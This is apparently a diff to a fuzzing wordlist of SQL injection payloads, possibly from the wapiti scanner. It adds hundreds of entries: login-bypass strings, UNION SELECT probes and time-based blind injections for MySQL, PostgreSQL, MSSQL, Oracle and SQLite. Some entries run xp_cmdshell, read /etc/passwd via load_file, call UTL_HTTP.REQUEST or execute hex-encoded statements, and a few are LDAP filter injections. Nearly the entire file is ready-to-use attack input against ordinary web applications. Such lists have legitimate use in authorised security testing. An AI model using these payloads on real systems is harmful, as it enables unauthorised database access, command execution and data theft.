@@ -1,85 +1,569 @@
+
+ or 1=1 --
+ or 3=3 --
+ (select top 1
  --
+ -- &password=
+ UNION ALL SELECT
+ UNION SELECT
+ and 1 in (select var from temp)--
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+ and SELECT SLEEP(5); #
+ and sleep 5
+ and sleep 5--
+ and sleep(5)
+ and sleep(5)--
+ group by userid having 1=1--
+ having 1=1--
+ or ''='
+ or '1'='1
+ or '1'='1'--
+ or '7659'='7659
+ or 'a'='a
+ or 'something' = 'some'+'thing'
+ or 'text' = n'text'
+ or 'text' > 't'
+ or 'unusual' = 'unusual'
+ or 'whatever' in ('whatever')
+ or (EXISTS)
+ or 0=0 #
+ or 0=0 #"
+ or 0=0 --
+ or 1 --'
+ or 1 in (select @@version)--
+ or 1/*
+ or 1=1
+ or 1=1 /*
+ or 1=1 or ""=
+ or 1=1 or ''='
+ or 1=1--
+ or 2 > 1
+ or 2 between 1 and 3
+ or 3=3
+ or SELECT SLEEP(5); #
+ or a = a
+ or a=a
+ or a=a--
+ or benchmark(10000000,MD5(1))#
+ or pg_sleep(__TIME__)--
+ or sleep 5
+ or sleep 5--
+ or sleep(5)
+ or sleep(5)--
+ or sleep(__TIME__)#
+ or sleep(__TIME__)='
+ or username like char(37);
+ select * from information_schema.tables--
+ select name from syscolumns where id = (sele ...
+ union all select @@version--
+ union select
+ union select * from users where login = char ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
 !
+"
 " "
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337" LIKE "1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337"="1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337" LIKE "1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337"="1337
+" AND ELT(1337=1337,SLEEP(5))-- 1337
+" AND SLEEP(5)#
+" OR SLEEP(5)#
+" RLIKE SLEEP(5) AND "1337" LIKE "1337
+" RLIKE SLEEP(5) AND "1337"="1337
+" RLIKE SLEEP(5)-- 1337
+" WAITFOR DELAY '0:0:5'--
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""^"
+" or "a"="a
+" or "x"="x
+" or 0=0 --
+" or 1=1--
+" or benchmark(10000000,MD5(1))#
+" or isNULL(1/0) /*
+" or pg_sleep(5)--
+" or pg_sleep(__TIME__)--
+" or sleep(__TIME__)#
+" or sleep(__TIME__)="
+" or true--
+""
 "&"
+")
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337" LIKE "1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337"="1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337" LIKE "1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337"="1337
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+") RLIKE SLEEP(5) AND ("1337" LIKE "1337
+") RLIKE SLEEP(5) AND ("1337"="1337
+") WAITFOR DELAY '0:0:5'--
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+") or ("x")=("x
+") or benchmark(10000000,MD5(1))#
+") or pg_sleep(5)--
+") or pg_sleep(__TIME__)--
+") or sleep(__TIME__)="
+") or true--
+"))
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337" LIKE "1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337"="1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337" LIKE "1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337"="1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+")) RLIKE SLEEP(5) AND (("1337" LIKE "1337
+")) RLIKE SLEEP(5) AND (("1337"="1337
+")) WAITFOR DELAY '0:0:5'--
+")) or (("x"))=(("x
+")) or benchmark(10000000,MD5(1))#
+")) or pg_sleep(5)--
+")) or pg_sleep(__TIME__)--
+")) or sleep(__TIME__)="
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337" LIKE "1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337"="1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337" LIKE "1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337"="1337
+"))) RLIKE SLEEP(5) AND ((("1337" LIKE "1337
+"))) RLIKE SLEEP(5) AND ((("1337"="1337
+"))) WAITFOR DELAY '0:0:5'--
+"));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:5'--
+");waitfor delay '0:0:__TIME__'--
 "*"
 "-"
+";SELECT SLEEP(5); #
+";SELECT pg_sleep(5);
+";sleep 5
+";sleep 5--
+";sleep(5)
+";sleep(5)--
+";waitfor delay '0:0:5'--
+";waitfor delay '0:0:__TIME__'--
 "^"
-&
-'
-' '
-'&'
-'*'
-'-'
-'^'
-(
-)
-*/*
-*|
-/
-//
-//*
-<>"'%;)(&+
-?
-|
-0
-0 or 1=1
-0x730065006c0065006300740020004000400076006500 ...
-0x770061006900740066006F0072002000640065006C00 ...
-0x77616974666F722064656C61792027303A303A313027 ...
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-1;(load_file(char(47,101,116,99,47,112,97,115, ...
-1 or 1=1
-1 or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
-1 or pg_sleep(__TIME__)--
-1) or pg_sleep(__TIME__)--
-1)) or pg_sleep(__TIME__)--
-1 or sleep(__TIME__)#
-1) or sleep(__TIME__)#
-1)) or sleep(__TIME__)#
-1;SELECT%20*
-1 waitfor delay '0:0:10'--
+"a"" or 1=1--"
+"a"" or 3=3--"
+"hi"") or (""a""=""a"
+#
+# from wapiti
+%
+%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
+%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337
+%' RLIKE SLEEP(5) AND '1337%'='1337
+%' WAITFOR DELAY '0:0:5'--
+%00
 %20$(sleep%2050)
-%20or%20''='
-'%20or%20''='
-%20or%201=1
-'%20or%201=1
-%20or%20'x'='x
-%20or%20x=x
-'%20or%20'x'='x
-')%20or%20('x'='x
-)%20or%20('x'='x
 %20'sleep%2050'
+%20or%20''='
+%20or%20'x'='x
+%20or%201=1
+%20or%20x=x
 %21
-21 %
-23 OR 1=1
+%22
+%23
 %26
-26 %
+%27
 %27%20or%201=1
 %28
-28 %
 %29
-29 %
 %2A%28%7C%28mail%3D%2A%29%29
 %2A%28%7C%28objectclass%3D%2A%29%29
 %2A%7C
-3.10E+17
-(||6)
-||'6
-||6
+%2c(select%5*%5from%5(select(sleep(5)))a)
+%3B
+%5c
 %7C
+&
+&&SLEEP(5)
+&&SLEEP(5)#
+&&SLEEP(5)--
+&apos;%20OR
+'
+' '
+' (select top 1
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337
+' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE
+' AND ELT(1337=1337,SLEEP(5))--
+' AND ELT(1337=1337,SLEEP(5))-- 1337
+' AND SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+' OR SLEEP(5)#
+' RLIKE SLEEP(5) AND '1337' LIKE '1337
+' RLIKE SLEEP(5) AND '1337'='1337
+' RLIKE SLEEP(5) OR '1337'='1337
+' RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)-- 1337
+' SELECT SLEEP(5); #
+' SELECT pg_sleep(5);
+' UNION ALL SELECT
+' UNION SELECT
+' WAITFOR DELAY '0:0:5'
+' WAITFOR DELAY '0:0:5'--
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' and sleep 5
+' and sleep 5 and '1'='1
+' and sleep 5--
+' and sleep(5)
+' and sleep(5) and '1'='1
+' and sleep(5)--
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1 --'
+' or 1=1
+' or 1=1 or ''='
+' or 1=1--
+' or 3=3
+' or a=a--
+' or benchmark(10000000,MD5(1))#
+' or pg_sleep(5)--
+' or pg_sleep(__TIME__)--
+' or sleep(__TIME__)#
+' or sleep(__TIME__)='
+' or true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+'"
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%2b(select*from(select(sleep(5)))a)%2b'
+'&&SLEEP(5)&&'1
+'&'
+''
+')
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337
+') AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND SLEEP(5)#
+') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+') OR SLEEP(5)#
+') RLIKE SLEEP(5) AND ('1337' LIKE '1337
+') RLIKE SLEEP(5) AND ('1337'='1337
+') RLIKE SLEEP(5)-- 1337
+') WAITFOR DELAY '0:0:5'--
+') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+') or ('a'='a
+') or ('x')=('x
+') or benchmark(10000000,MD5(1))#
+') or pg_sleep(5)--
+') or pg_sleep(__TIME__)--
+') or sleep(__TIME__)='
+') or true--
+')%20or%20('x'='x
+'))
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+')) RLIKE SLEEP(5) AND (('1337' LIKE '1337
+')) RLIKE SLEEP(5) AND (('1337'='1337
+')) WAITFOR DELAY '0:0:5'--
+')) or (('x'))=(('x
+')) or benchmark(10000000,MD5(1))#
+')) or pg_sleep(5)--
+')) or pg_sleep(__TIME__)--
+')) or sleep(__TIME__)='
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337
+'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337
+'))) RLIKE SLEEP(5) AND ((('1337'='1337
+'))) WAITFOR DELAY '0:0:5'--
+'));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:5'--
+');waitfor delay '0:0:__TIME__'--
+'*'
+'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+'
+'+(select*from(select(sleep(5)))a)+'
+'-'
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+';%5waitfor%5delay%5'0:0:5'%5--%5
+';WAITFOR DELAY '0:0:5'--
+';waitfor delay '0:0:5'--
+';waitfor delay '0:0:__TIME__'--
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+'^'
+'hi' or 'x'='x';
+'sqlattempt1
+'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'||UTL_HTTP.REQUEST
+(
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--
+(SELECT SLEEP(5))
+(SELECT pg_sleep(5))
+(select(0)from(select(sleep(5)))v)
+(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f
+(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/
+(select*from(select(sleep(5)))a)
+(sleep 5)
+(sleep 5)--
+(sleep(5))
+(sleep(5))--
+(sqlattempt2)
+(sqlvuln)
+(||6)
+)
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
+) AND ELT(1337=1337,SLEEP(5)) AND (1337=1337
+) AND ELT(1337=1337,SLEEP(5))-- 1337
+) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+) RLIKE SLEEP(5) AND (1337=1337
+) RLIKE SLEEP(5)-- 1337
+) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+) or ('a'='a
+) or (a=a
+) or benchmark(10000000,MD5(1))#
+) or pg_sleep(__TIME__)--
+) or sleep(__TIME__)='
+) union select * from information_schema.tables;
+)%20or%20('x'='x
+))
+)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337
+)) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337
+)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+)) RLIKE SLEEP(5) AND ((1337=1337
+)) or benchmark(10000000,MD5(1))#
+)) or pg_sleep(__TIME__)--
+)) or sleep(__TIME__)='
+))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337
+))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337
+))) RLIKE SLEEP(5) AND (((1337=1337
+));waitfor delay '0:0:5'--
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:5'--
+);waitfor delay '0:0:__TIME__'--
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
++ SLEEP(5) + '
++(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+
++(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
++(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+
++sqlvuln
+,
+,(select * from (select(sleep(5)))a)
+,@variable
+--sp_password
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-sleep(5)
+.
+/
+/**/or/**/1/**/=/**/1
+//
+//*
+0
+0 or 1=1
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
+1 AND ELT(1337=1337,SLEEP(5))
+1 AND ELT(1337=1337,SLEEP(5))# 1337
+1 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 RLIKE SLEEP(5)
+1 RLIKE SLEEP(5)# 1337
+1 RLIKE SLEEP(5)-- 1337
+1 SELECT SLEEP(5); #
+1 SELECT pg_sleep(5);
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'-- 1337
+1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+1 and sleep 5
+1 and sleep 5--
+1 and sleep(5)
+1 and sleep(5)--
+1 or 1=1
+1 or benchmark(10000000,MD5(1))#
+1 or pg_sleep(5)--
+1 or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1 waitfor delay '0:0:10'--
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
+1' WAITFOR DELAY '0:0:5' AND '1337'='1337
+1'%2b(select*from(select(sleep(5)))a)%2b'
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
+1') WAITFOR DELAY '0:0:5' AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
+1) WAITFOR DELAY '0:0:5' AND (1337=1337
+1) or benchmark(10000000,MD5(1))#
+1) or pg_sleep(5)--
+1) or pg_sleep(__TIME__)--
+1) or sleep(__TIME__)#
+1)) or benchmark(10000000,MD5(1))#
+1)) or pg_sleep(5)--
+1)) or pg_sleep(__TIME__)--
+1)) or sleep(__TIME__)#
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;SELECT%20*
+1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1
+21 %
+23 OR 1=1
+26 %
+28 %
+29 %
+3.10E+17
+;
+; begin declare @var varchar(8000) set @var=' ...
+; exec ('sel' + 'ect us' + 'er')
+; exec master..xp_cmdshell
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec xp_regread
+; execute immediate 'sel' || 'ect us' || 'er'
+; or '1'='1'
+;SELECT SLEEP(5); #
+;SELECT pg_sleep(5);
+;WAITFOR DELAY '0:0:5'
+;WAITFOR DELAY '0:0:5'--
+;sleep 5
+;sleep 5--
+;sleep(5)
+;sleep(5)--
+;waitfor delay '0:0:5'--
+;waitfor delay '0:0:__TIME__'--
+<>"'%;)(&+
+?
+@var select @var as var into temp end --
+@variable
+AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+AND BLIND:
+AnD SLEEP(5)
+AnD SLEEP(5)#
+AnD SLEEP(5)--
+OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR BLIND:
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)#
+ORDER BY SLEEP(5)--
+PRINT
+PRINT @@variable
+Postgresql Blind (Time Based):
+RANDOMBLOB(1000000000/2)
+RANDOMBLOB(500000000/2)
+RLIKE SLEEP(5)--
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+SLEEP(5)="
+SLEEP(5)='
+WAITFOR DELAY '0:0:5'
+\
+\\
+\x27UNION SELECT
+]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1
+]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1
+`
+` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1
+``
 a'
-Ã½ or 1=1 --
+a' or 'a' = 'a
+a' or 1=1--
+a' or 3=3--
+a' waitfor delay '0:0:10'--
 admin" #
 admin" --
-admin"/*
-admin' #
-admin' --
-admin'/*
-admin' or '
 admin" or "1"="1
 admin" or "1"="1"#
 admin" or "1"="1"--
@@ -96,6 +580,11 @@ admin") or ("1"="1
 admin") or ("1"="1"#
 admin") or ("1"="1"--
 admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' or '
 admin' or '1'='1
 admin' or '1'='1'#
 admin' or '1'='1'--
@@ -112,24 +601,23 @@ admin') or ('1'='1
 admin') or ('1'='1'#
 admin') or ('1'='1'--
 admin') or ('1'='1'/*
-admin"or 1=1 or ""="
+admin'/*
 admin'or 1=1 or ''='
- and 1=( if((load_file(char(110,46,101,120,11 ...
- and 1 in (select var from temp)--
+and SELECT SLEEP(5); #
+and SELECT pg_sleep(5);
+and WAITFOR DELAY '0:0:5'
+and WAITFOR DELAY '0:0:5'--
+and sleep 5
+and sleep 5--
+and sleep(5)
+and sleep(5)--
 anything' OR 'x'='x
-"a"" or 1=1--"
-a' or 1=1--
-â or 1=1 --
-"a"" or 3=3--"
-a' or 3=3--
-â or 3=3 --
-a' or 'a' = 'a
-&apos;%20OR
 as
 asc
-a' waitfor delay '0:0:10'--
-; begin declare @var varchar(8000) set @var=' ...
 benchmark(10000000,MD5(1))#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))#
+benchmark(50000000,MD5(1))--
 bfilename
 char%4039%41%2b%40SELECT
 declare @q nvarchar (200) 0x730065006c00650063 ...
@@ -139,184 +627,78 @@ declare @q nvarchar (200) select @q = 0x770061006900740066006F007200200064006500
 declare @q nvarchar (4000) select @q =
 declare @s varchar (200) select @s = 0x73656c6 ...
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar (8000) select @s = 0x73656c ...
 declare @s varchar(200) select @s = 0x77616974 ...
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
 declare @s varchar(22) select @s =
-declare @s varchar (8000) select @s = 0x73656c ...
 delete
 desc
+desc%2c(select*from(select(sleep(5)))a)
 distinct
-||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-'; exec master..xp_cmdshell
-; exec master..xp_cmdshell
-'; exec master..xp_cmdshell 'ping 172.10.1.255'--
-; exec master..xp_cmdshell 'ping 172.10.1.255'--
-exec(@s)
-; exec ('sel' + 'ect us' + 'er')
 exec sp
-; execute immediate 'sel' || 'ect us' || 'er'
 exec xp
-'; exec xp_regread
-; exec xp_regread
-# from wapiti
- group by userid having 1=1--
+exec(@s)
 handler
 having
- having 1=1--
 hi or 1=1 --"
-hi' or 1=1 --
-"hi"") or (""a""=""a"
 hi or a=a
 hi' or 'a'='a
-hi') or ('a'='a
-'hi' or 'x'='x';
 hi' or 'x'='x';
+hi' or 1=1 --
+hi') or ('a'='a
+if(now()=sysdate(),sleep(5),0)
+if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
+if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
+if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
 insert
 like
 limit
-*(|(mail=*))
-*(|(objectclass=*))
- or ''='
-" or "" "
-" or ""&"
-" or ""*"
-" or ""-"
-" or ""^"
-' or '' '
-' or ''&'
-' or ''*'
-' or ''-'
-' or ''='
-' or ''^'
 or
- or 0=0 #
- or 0=0 #"
- or 0=0 --
-" or 0=0 --
-' or 0=0 #
-' or 0=0 --
 or 0=0 #
 or 0=0 #"
 or 0=0 --
- or 1 --'
- or 1/*
-' or 1 --'
- or 1=1 --
- or '1'='1
- or '1'='1'--
- or 1=1
- or 1=1 /*
- or 1=1--
-" or 1=1--
-' or '1'='1'--
-' or 1=1
-' or 1=1--
